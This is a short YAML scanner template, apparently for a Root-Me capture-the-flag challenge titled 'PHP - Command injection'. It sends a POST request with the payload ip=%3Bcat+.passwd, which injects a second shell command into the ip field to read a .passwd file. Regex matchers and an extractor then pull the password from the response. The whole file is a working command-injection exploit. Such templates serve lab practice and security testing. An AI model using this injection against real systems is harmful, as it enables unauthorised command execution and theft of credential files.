id: PHP-Commandinjection

info:
  name: PHP - Command injection
  author: Tomitom13
  severity: unknown
  tags: command-injection,php,rootme

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Content-Type: application/x-www-form-urlencoded

        ip=%3Bcat+.passwd

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        regex:
          - "S[a-zA-Z0-9!@#$%^&*()_+,.?]+re"
        part: body

    extractors:
      - type: regex
        name: password
        part: body
        regex:
          - "S[a-zA-Z0-9!@#$%^&*()_+,.?]+re"
